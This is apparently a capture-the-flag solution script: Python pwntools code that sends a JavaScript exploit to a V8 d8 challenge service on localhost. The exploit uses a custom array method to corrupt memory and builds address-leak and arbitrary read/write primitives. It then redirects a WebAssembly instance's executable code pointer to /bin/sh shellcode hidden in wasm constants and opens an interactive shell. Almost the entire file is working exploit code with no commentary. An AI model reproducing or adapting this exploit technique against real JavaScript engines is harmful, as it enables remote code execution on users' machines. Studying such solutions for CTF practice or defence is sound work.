from pwn import *

sol_script = """
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);


function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function setULBits(low,high){
    u64_buf[0] = Number(low);
    u64_buf[1] = Number(high);
    return f64_buf[0];
}

// ========= Primitives =========

function addrOf(obj){
    let leak;
    obj_arr[0] = obj;
    flt_arr[76] = setULBits(0x11n,0x0080b4f1n);
    leak = obj_arr[0];
    flt_arr[76] = setULBits(0x11n,0x0080b579n);
    return ftoi(leak);
}


function arbRead(addr){
    // oob read flt_arr[24]: 160088494d <flt_arr_2's elements ptr>
   flt_arr[24] = setULBits(addr - 8n, 0x16n);
   return ftoi(flt_arr_2[0]);
}

function arbWrite(addr, val){
   flt_arr[24] = setULBits(addr - 8n, 0x16n);
   flt_arr_2[0] = itof(val);
}

function do_pwn(){
    let trusted_data_ptr = arbRead((addrOf(shell_wasm_instance) & 0xffffffffn) + 0xcn) & 0xffffffffn;
    let shell_wasm_rwx_addr = arbRead(trusted_data_ptr + 0x28n);
    let shellcode_addr = shell_wasm_rwx_addr + 2471n;
    arbWrite(trusted_data_ptr + 0x28n, shellcode_addr);
    shell_func();
}

// ========= Exploit =========

// code exec
let shell_wasm_code = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0, 0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105, 110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72, 49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57, 3, 0, 65, 42, 11
  ]); // /bin/sh shellcode inside this

let shell_wasm_module = new WebAssembly.Module(shell_wasm_code);
let shell_wasm_instance = new WebAssembly.Instance(shell_wasm_module);
let shell_func = shell_wasm_instance.exports.main;
// shell_func();


// =========== ALL INITIALIZATIONS ARE DONE ===========
// EXP PART STARTS HERE ===========
// main exp
// let idk_arr = [1.1]
let arr = [1.1];
arr.cat1 = 1337;
arr.cat2 = 1338;
arr.cat3 = 1338;
arr.cat4 = 1338;
arr.cat5 = 1338;
let flt_arr = Array(20).fill(1.1);
let flt_arr_2 = Array(11).fill(1.2);
let flt_arr_3 = Array(12).fill(1.3);
let obj_arr = [{}];

arr.magic(arr.length,39);
arr.cat1 = 1337

do_pwn();
"""

#p = process('./start_d8.py')
HOST = "localhost"
PORT = 1337
p = remote(HOST, PORT)
p.sendlineafter('size',str(len(sol_script)))
p.sendline(sol_script)
p.interactive()
